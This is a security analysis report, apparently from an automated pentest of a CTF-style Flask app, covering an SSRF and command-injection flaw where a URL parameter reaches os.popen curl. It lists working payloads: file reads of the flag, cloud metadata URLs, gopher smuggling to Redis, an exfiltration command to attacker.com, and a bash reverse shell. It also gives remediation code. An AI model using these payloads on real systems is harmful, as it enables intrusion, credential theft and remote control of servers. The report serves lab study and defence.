# SSRF Analysis Report

## 1. Executive Summary

- **Analysis Status:** Complete
- **Key Outcome:** Four high-confidence server-side request forgery vulnerabilities were identified, all stemming from a single critical code sink where user-controlled URLs are passed directly to curl via shell execution without any validation or sanitization.
- **Purpose of this Document:** This report provides strategic context on the application's outbound request mechanisms, dominant flaw patterns, and architectural details necessary to effectively exploit the vulnerabilities listed in the exploitation queue.

**Critical Finding:** The application exhibits a textbook SSRF vulnerability (CWE-918) compounded by OS command injection (CWE-78) at the same sink. User input flows directly from an HTTP POST parameter to shell command execution with **zero security controls**, enabling unrestricted access to internal services, cloud metadata endpoints, local files, and arbitrary command execution.

**Risk Level:** CRITICAL - This vulnerability allows external, unauthenticated attackers to:
- Access internal network services and APIs
- Retrieve cloud provider credentials from metadata endpoints
- Read local files including the CTF flag file
- Execute arbitrary OS commands
- Perform internal network reconnaissance
- Bypass all network segmentation controls

## 2. Dominant Vulnerability Patterns

### Pattern 1: Complete Absence of URL Validation

- **Description:** The most critical and pervasive pattern is the complete absence of any URL validation, sanitization, or filtering. User-supplied URLs are accepted verbatim and passed directly to curl via shell execution.
- **Implication:** Attackers have unrestricted control over the protocol scheme, hostname, IP address, port, path, and query parameters of server-side HTTP requests. This enables accessing any network-reachable resource from the server's perspective, including internal services invisible to external attackers.
- **Representative Findings:** `SSRF-VULN-01` (URL Manipulation), `SSRF-VULN-02` (File Fetch Abuse), `SSRF-VULN-03` (Service Discovery)
- **Code Evidence:** 
  - Line 27: `url = request.form['url']` - Direct extraction with zero validation
  - Line 28: `response = check_url(url)` - Immediate pass-through to vulnerable function
  - Line 18: `command = f'curl -o /dev/null -s -w "%{{http_code}}" "{url}"'` - Direct f-string interpolation
  - Line 19: `with os.popen(command) as output:` - Shell execution

### Pattern 2: Dangerous Use of os.popen() for HTTP Requests

- **Description:** The application uses `os.popen()` to execute shell commands for making HTTP requests instead of using safe HTTP client libraries like `requests` or `urllib`. This pattern introduces both SSRF and command injection vulnerabilities simultaneously.
- **Implication:** The use of shell execution for HTTP requests is fundamentally insecure. It allows attackers to break out of the curl command context using shell metacharacters, enabling arbitrary command execution beyond SSRF capabilities.
- **Representative Finding:** `SSRF-VULN-01` (combines SSRF with command injection)
- **Safer Alternative:** Use Python's `requests` library or `urllib` with proper URL validation instead of shelling out to curl.

### Pattern 3: No Protocol Restrictions

- **Description:** The application accepts any URL protocol scheme that curl supports, including dangerous protocols like `file://`, `gopher://`, `dict://`, `ldap://`, `ftp://`, etc.
- **Implication:** Attackers can use `file://` to read local files, `gopher://` for protocol smuggling attacks against internal services, and other protocols for various attack vectors beyond standard HTTP/HTTPS SSRF.
- **Representative Findings:** `SSRF-VULN-02` (file:// abuse), `SSRF-VULN-04` (protocol abuse)

### Pattern 4: No Network Boundary Enforcement

- **Description:** The application performs no IP address filtering, hostname validation, or network range restrictions. Requests to private IP ranges (RFC 1918), loopback addresses, link-local addresses, and cloud metadata endpoints are all permitted.
- **Implication:** Attackers can leverage the application server as a proxy to access internal network resources, bypassing firewall rules and network segmentation. Cloud metadata endpoints (169.254.169.254) can be accessed to retrieve IAM credentials and sensitive instance configuration.
- **Representative Finding:** `SSRF-VULN-03` (Service Discovery / Cloud Metadata Retrieval)

### Pattern 5: Blind SSRF with Status Code Leakage

- **Description:** While the application does not return response bodies to the user (curl uses `-o /dev/null`), it returns HTTP status codes via the `-w "%{http_code}"` flag. This creates a semi-blind SSRF scenario.
- **Implication:** Attackers can perform port scanning and service discovery by analyzing returned HTTP status codes and response timing. Open ports return specific codes (200, 404, 401), closed ports cause connection errors, and filtered ports cause timeouts.
- **Representative Finding:** `SSRF-VULN-03` (Service Discovery via timing and status codes)

## 3. Strategic Intelligence for Exploitation

### HTTP Client Architecture

**HTTP Client Library:** curl (command-line tool, version unspecified)
- Invoked via: `os.popen()` shell execution
- Command structure: `curl -o /dev/null -s -w "%{http_code}" "{USER_INPUT}"`
- Flags explained:
  - `-o /dev/null`: Discard response body (blind SSRF)
  - `-s`: Silent mode (no progress bar)
  - `-w "%{http_code}"`: Return only HTTP status code
  - User input embedded in double quotes (bypassable)

**Critical Security Implications:**
1. **Shell Execution Context:** Using `os.popen()` invokes `/bin/sh -c`, allowing command injection via shell metacharacters
2. **Protocol Support:** curl supports 20+ protocols including file://, gopher://, dict://, ldap://, ftp://, smb://
3. **Follow Redirects:** curl follows HTTP redirects by default, enabling redirect-based SSRF bypasses
4. **No Timeout:** No timeout specified, allowing indefinite hangs

### Request Architecture

**Data Flow Path:**
```
User Input (HTTP POST)
    ↓
request.form['url'] (line 27)
    ↓
check_url(url) function call (line 28)
    ↓
f-string interpolation (line 18)
    ↓
os.popen(command) execution (line 19)
    ↓
Outbound curl request to user-specified URL
    ↓
HTTP status code returned to application (line 20)
    ↓
Stored in database if status contains '200' (lines 30-33)
```

**Authentication Requirements:** NONE - The `/add_url` endpoint is publicly accessible without authentication
**Rate Limiting:** NONE - Unlimited requests allowed
**CSRF Protection:** NONE - Endpoint vulnerable to CSRF attacks

### Internal Services Discovered

**From Docker Container Context:**
- **Localhost Services:** 127.0.0.1 (loopback)
- **Docker Host:** 172.17.0.1 (standard Docker bridge network gateway)
- **Container Network:** 172.17.0.0/16 (Docker bridge network)
- **Application Port (Internal):** 5003 (Flask app listening on 0.0.0.0:5003)

**Potential Internal Service Targets:**
- Flask application itself: `http://127.0.0.1:5003/`
- Docker daemon: `http://172.17.0.1:2375/` or `http://172.17.0.1:2376/`
- Any other services running on host accessible from container
- Other Docker containers on the same bridge network

**File System Targets:**
- Flag file: `/app/flag.txt` (created at startup, world-readable)
- Application source: `/app/app.py`
- Environment variables: `/proc/self/environ`
- System files: `/etc/passwd`, `/etc/hosts`

**Cloud Metadata Endpoints (if deployed to cloud):**
- AWS IMDSv1: `http://169.254.169.254/latest/meta-data/`
- AWS IMDSv2: Requires token header (exploitable via command injection)
- GCP: `http://metadata.google.internal/computeMetadata/v1/`
- Azure: `http://169.254.169.254/metadata/instance?api-version=2021-02-01`

### Exploitation Techniques

**1. Internal Service Access (Classic SSRF)**
```
Payload: http://127.0.0.1:5003/
Expected Result: Access to Flask app's own endpoints
Confidence: High
```

**2. Local File Reading (file:// Protocol)**
```
Payload: file:///app/flag.txt
Expected Result: Flag file content accessible (semi-blind)
Confidence: High
Note: Content not directly returned, but can be exfiltrated via command injection
```

**3. Cloud Metadata Access**
```
Payload: http://169.254.169.254/latest/meta-data/
Expected Result: AWS instance metadata and IAM credentials
Confidence: High (if deployed on AWS)
```

**4. Port Scanning / Service Discovery**
```
Payload: http://127.0.0.1:PORT/ (iterate ports 1-65535)
Expected Result: Map internal services via status codes and timing
Technique: 
  - 200/404/401 = HTTP service on open port
  - Connection refused = closed port
  - Timeout = filtered port
Confidence: High
```

**5. Protocol Smuggling (gopher://)**
```
Payload: gopher://127.0.0.1:6379/_SET%20key%20value
Expected Result: Send arbitrary TCP data to Redis
Confidence: Medium (requires Redis running internally)
```

**6. Command Injection Escalation**
```
Payload: " && cat /app/flag.txt #
Expected Result: Break out of curl, execute arbitrary commands
Confidence: High
Note: This is the most direct exploitation path
```

### Response Analysis

**What Attackers Can Learn from Responses:**

1. **HTTP Status Codes:** Application returns status codes in JSON response
   - Example success: `{"success": true, "message": "URL added successfully!"}`
   - Example failure: `{"success": false, "message": "Failed to add URL. Please ensure it's a valid and accessible URL."}`

2. **Timing Analysis:**
   - Fast response (~10ms): Connection refused (closed port)
   - Medium response (~100ms): HTTP service responded
   - Slow response (~2s timeout): Filtered port or non-HTTP service

3. **Error Messages:** Generic error messages provide minimal information leakage

4. **Database Storage:** URLs returning HTTP 200 are stored in database, visible at GET `/`

## 4. Secure by Design: Validated Components

**Status:** This application has ZERO secure components related to SSRF protection.

After comprehensive analysis of the entire codebase, no SSRF defenses were found. The table below would normally list components with robust defenses, but this application implements none.

| Component/Flow | Endpoint/File Location | Defense Mechanism Implemented | Verdict |
|---|---|---|---|
| *No secure components found* | - | - | - |

**What SHOULD Exist (But Doesn't):**

| Expected Defense | Purpose | Status |
|---|---|---|
| Protocol Allowlist | Restrict to http/https only | ❌ NOT IMPLEMENTED |
| IP Address Filtering | Block RFC 1918, loopback, link-local ranges | ❌ NOT IMPLEMENTED |
| Hostname Validation | Allowlist permitted domains | ❌ NOT IMPLEMENTED |
| Port Restrictions | Allow only ports 80, 443, 8080, 8443 | ❌ NOT IMPLEMENTED |
| DNS Rebinding Protection | Validate resolved IPs before request | ❌ NOT IMPLEMENTED |
| Request Timeout | Prevent resource exhaustion | ❌ NOT IMPLEMENTED |
| Safe HTTP Library | Use requests/urllib instead of curl | ❌ NOT IMPLEMENTED |
| Input Sanitization | Validate URL format and components | ❌ NOT IMPLEMENTED |

## 5. Backward Taint Analysis Summary

### SSRF Sink Analysis

**Sink Location:** `/app/app.py:18-19` (check_url function)

**Backward Trace:**
```
SINK: os.popen(command)  [line 19]
  ↑
  command = f'curl ... "{url}"'  [line 18]
  ↑
  url parameter (function argument)
  ↑
  check_url(url) call  [line 28]
  ↑
  url = request.form['url']  [line 27]
  ↑
SOURCE: HTTP POST parameter 'url'
```

**Sanitization Checkpoints Encountered:** NONE

**Path Verdict:** VULNERABLE - Direct source-to-sink path with zero sanitization

**Confidence:** HIGH - Deterministic vulnerability with no alternate controls

### Detailed Analysis per Methodology Check

#### 1. HTTP Client Usage Pattern Analysis ✅

**Finding:** Application uses curl (external binary) via os.popen() for HTTP requests
- **Code Location:** app.py:17-21
- **User Input Path:** request.form['url'] → check_url(url) → os.popen()
- **Classification:** URL_manipulation
- **Verdict:** VULNERABLE

#### 2. Protocol and Scheme Validation ✅

**Finding:** No protocol validation exists
- **Allowed Protocols:** ALL protocols curl supports (http, https, file, ftp, gopher, dict, ldap, smb, etc.)
- **Blocklist:** Does not exist
- **Allowlist:** Does not exist
- **Verdict:** VULNERABLE - Failed check
- **Classification:** URL_manipulation / protocol_abuse

#### 3. Hostname and IP Address Validation ✅

**Finding:** No hostname or IP filtering exists
- **Private IPs (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16):** NOT BLOCKED
- **Loopback (127.0.0.0/8):** NOT BLOCKED
- **Link-Local (169.254.0.0/16):** NOT BLOCKED
- **Cloud Metadata (169.254.169.254):** NOT BLOCKED
- **DNS Rebinding Protection:** NONE
- **Verdict:** VULNERABLE - Failed check
- **Classification:** service_discovery

#### 4. Port Restriction and Service Access Controls ✅

**Finding:** No port restrictions exist
- **Approved Ports:** NONE (all ports 1-65535 accessible)
- **Blocked Ports:** NONE
- **Cloud Metadata Endpoint Protection:** NONE
- **Verdict:** VULNERABLE - Failed check
- **Classification:** service_discovery / cloud_metadata_retrieval

#### 5. URL Parsing and Validation Bypass Techniques ✅

**Finding:** No URL parsing or validation logic exists
- **URL Encoding Handling:** Passed directly to curl (curl handles encoding)
- **Redirect Following:** curl follows redirects by default (no --max-redirs restriction)
- **Malformed URL Handling:** No validation, passed to curl as-is
- **Verdict:** VULNERABLE - No validation to bypass
- **Classification:** url_manipulation / filter_bypass

#### 6. Request Modification and Headers ✅

**Finding:** Application does not proxy external requests with user headers, but command injection allows header injection
- **Sensitive Header Stripping:** N/A (not a proxy)
- **Custom Header Injection:** Possible via command injection ("; curl -H 'X-Custom: value' ...")
- **Timeout Settings:** No timeout configured (indefinite wait possible)
- **Verdict:** VULNERABLE - Command injection enables header manipulation
- **Classification:** api_proxy_bypass

#### 7. Response Handling and Information Disclosure ✅

**Finding:** Blind SSRF with status code leakage
- **Error Messages:** Generic error messages, minimal internal network information leaked
- **Response Content:** Discarded via -o /dev/null (blind SSRF)
- **Response Status Codes:** Returned to user via -w "%{http_code}"
- **Response Size Limits:** None (irrelevant as content discarded)
- **Verdict:** VULNERABLE - Status codes enable service discovery
- **Classification:** service_discovery

## 6. Combined Vulnerability: SSRF + Command Injection

**Critical Note:** This SSRF vulnerability is uniquely severe because it's **combined with OS command injection** at the same sink.

### Why This Matters for Exploitation:

1. **Direct Flag Access:** Attackers don't need to rely on SSRF alone - they can use command injection to directly read the flag file:
   ```
   Payload: " && cat /app/flag.txt #
   ```

2. **Enhanced Exfiltration:** SSRF file:// protocol may have blind response, but command injection allows active exfiltration:
   ```
   Payload: " && curl -X POST -d @/app/flag.txt http://attacker.com/exfil #
   ```

3. **Reverse Shell:** Complete system compromise beyond network access:
   ```
   Payload: " && bash -i >& /dev/tcp/attacker.com/4444 0>&1 #
   ```

4. **Header Injection for Cloud Metadata:** AWS IMDSv2 requires headers, achievable via command injection:
   ```
   Payload: " && curl -H 'X-aws-ec2-metadata-token: $(curl -X PUT http://169.254.169.254/latest/api/token -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\")' http://169.254.169.254/latest/meta-data/ #
   ```

### Exploitation Priority:

Given the dual vulnerability nature:
1. **Primary Vector:** Command injection (simplest, most direct)
2. **Secondary Vector:** SSRF (if command injection somehow blocked)
3. **Tertiary Vector:** Combination attacks (SSRF + command injection for complex scenarios)

## 7. Network Accessibility and External Exploitability

**Endpoint:** POST /add_url
**URL:** http://localhost:5094/add_url
**Authentication Required:** NO (publicly accessible)
**Network Exposure:** Externally accessible from the internet
**Docker Port Mapping:** 5094:5003 (external:internal)

**External Exploitability Verdict:** ✅ YES - Fully exploitable by external, unauthenticated attackers

**Attack Requirements:**
- HTTP client (curl, browser, Burp Suite, etc.)
- No credentials needed
- No session required
- No CSRF token required
- No rate limiting bypass needed

**Minimum Exploit:**
```bash
curl -X POST http://localhost:5094/add_url \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "url=http://127.0.0.1:5003/"
```

## 8. Risk Assessment and Impact

### CVSS 3.1 Score: 9.8 (CRITICAL)

**Vector String:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

**Breakdown:**
- **Attack Vector (AV:N):** Network - Exploitable from internet
- **Attack Complexity (AC:L):** Low - No special conditions required
- **Privileges Required (PR:N):** None - No authentication needed
- **User Interaction (UI:N):** None - Fully automated exploitation
- **Scope (S:U):** Unchanged - Impacts vulnerable component only
- **Confidentiality (C:H):** High - Full file system read, cloud credentials
- **Integrity (I:H):** High - Can modify internal services via SSRF/command injection
- **Availability (A:H):** High - Can DoS internal services, execute commands

### Business Impact:

1. **Data Breach:** Access to flag file, application source code, environment variables, cloud credentials
2. **Network Compromise:** Ability to access all internal services from server perspective
3. **Privilege Escalation:** Cloud metadata access grants IAM role credentials
4. **Lateral Movement:** Port scanning and service discovery enable mapping internal infrastructure
5. **Complete System Compromise:** Command injection allows arbitrary code execution

### Affected Components:

- Primary: POST /add_url endpoint (app.py:24-41)
- Secondary: check_url() function (app.py:17-21)
- Data Storage: URLs saved to database (potential persistence)
- File System: All files readable by application user (root in container)
- Network: All services reachable from server's network perspective

## 9. Remediation Recommendations

### Immediate Actions (Critical Priority):

1. **Replace os.popen() with Safe HTTP Library:**
   ```python
   import requests
   from urllib.parse import urlparse
   
   def check_url(url):
       try:
           # Parse and validate URL
           parsed = urlparse(url)
           
           # Allowlist protocols
           if parsed.scheme not in ['http', 'https']:
               return None
           
           # Block private IPs (simplified - use ipaddress module)
           # ... IP filtering logic ...
           
           # Make request with timeout
           response = requests.get(url, timeout=5, allow_redirects=False)
           return str(response.status_code)
       except Exception:
           return None
   ```

2. **Implement Protocol Allowlist:**
   - Only allow `http://` and `https://` schemes
   - Reject all other protocols (file, gopher, dict, ftp, ldap, etc.)

3. **Implement IP Address Filtering:**
   ```python
   import ipaddress
   
   def is_safe_ip(ip_str):
       ip = ipaddress.ip_address(ip_str)
       
       # Block private ranges
       if ip.is_private:
           return False
       
       # Block loopback
       if ip.is_loopback:
           return False
       
       # Block link-local (169.254.0.0/16)
       if ip.is_link_local:
           return False
       
       # Block multicast and reserved
       if ip.is_multicast or ip.is_reserved:
           return False
       
       return True
   ```

4. **Implement DNS Validation:**
   - Resolve hostname to IP before making request
   - Validate resolved IP is not private/internal
   - Protect against DNS rebinding by re-checking before request

### Secondary Actions (High Priority):

5. **Add Hostname Allowlist (if specific domains expected):**
   ```python
   ALLOWED_DOMAINS = ['example.com', 'trusted-api.com']
   
   if parsed.hostname not in ALLOWED_DOMAINS:
       return None
   ```

6. **Implement Port Restrictions:**
   ```python
   ALLOWED_PORTS = [80, 443, 8080, 8443]
   
   port = parsed.port or (443 if parsed.scheme == 'https' else 80)
   if port not in ALLOWED_PORTS:
       return None
   ```

7. **Add Request Timeouts:**
   ```python
   response = requests.get(url, timeout=5)  # 5 second timeout
   ```

8. **Disable Redirect Following:**
   ```python
   response = requests.get(url, allow_redirects=False)
   ```

9. **Add Rate Limiting:**
   ```python
   from flask_limiter import Limiter
   
   limiter = Limiter(app, key_func=get_remote_address)
   
   @app.route('/add_url', methods=['POST'])
   @limiter.limit("10 per minute")
   def add_url():
       # ...
   ```

10. **Implement Authentication:**
    - Add Flask-Login or similar authentication framework
    - Require valid user session before accepting URL submissions

### Defense in Depth (Medium Priority):

11. **Network Segmentation:**
    - Deploy application in isolated network segment
    - Use firewall rules to restrict outbound connections
    - Implement egress filtering at network level

12. **Cloud Metadata Protection (if deployed to cloud):**
    - AWS: Require IMDSv2 (requires token header)
    - Explicitly block 169.254.169.254 at application level
    - Use network ACLs to block metadata endpoint access

13. **Logging and Monitoring:**
    - Log all URL access attempts with source IP
    - Alert on suspicious patterns (localhost, private IPs, multiple ports)
    - Monitor for cloud metadata access attempts

14. **Content Security Policy:**
    - Implement CSP headers to prevent data exfiltration via injected scripts

## 10. Testing Validation

### Proof-of-Concept Payloads (For Exploitation Phase):

**Test 1: Internal Service Access**
```
POST /add_url
Content-Type: application/x-www-form-urlencoded

url=http://127.0.0.1:5003/
```

**Test 2: File Read (Blind)**
```
POST /add_url
Content-Type: application/x-www-form-urlencoded

url=file:///app/flag.txt
```

**Test 3: Cloud Metadata (if AWS)**
```
POST /add_url
Content-Type: application/x-www-form-urlencoded

url=http://169.254.169.254/latest/meta-data/
```

**Test 4: Port Scan (Timing Analysis)**
```
POST /add_url
Content-Type: application/x-www-form-urlencoded

url=http://127.0.0.1:PORT/
[Iterate PORT from 1-65535, measure timing]
```

**Test 5: Command Injection (Most Direct)**
```
POST /add_url
Content-Type: application/x-www-form-urlencoded

url=" && cat /app/flag.txt #
```

## 11. Conclusion

This SSRF analysis has identified **CRITICAL vulnerabilities** in the SiteSaver Flask application stemming from the complete absence of URL validation and the dangerous use of `os.popen()` for HTTP requests. The application is trivially exploitable by external, unauthenticated attackers and enables:

1. Unrestricted access to internal network services
2. Cloud metadata and credential theft
3. Local file system access
4. Arbitrary command execution
5. Internal network reconnaissance

**All four vulnerabilities documented in the exploitation queue are externally exploitable and confirmed with HIGH confidence.** The combination of SSRF and command injection at the same sink represents a complete security failure that requires immediate remediation before any production deployment.

The next phase (SSRF Exploitation) should focus on:
1. Validating internal service access (127.0.0.1:5003)
2. Confirming file:// protocol access to flag file
3. Testing cloud metadata endpoint access (if cloud-deployed)
4. Demonstrating command injection for direct flag retrieval
5. Mapping internal network via port scanning

**Final Verdict:** The application is CRITICALLY VULNERABLE to SSRF attacks with ZERO defensive measures in place. External exploitation requires only a single HTTP POST request without authentication.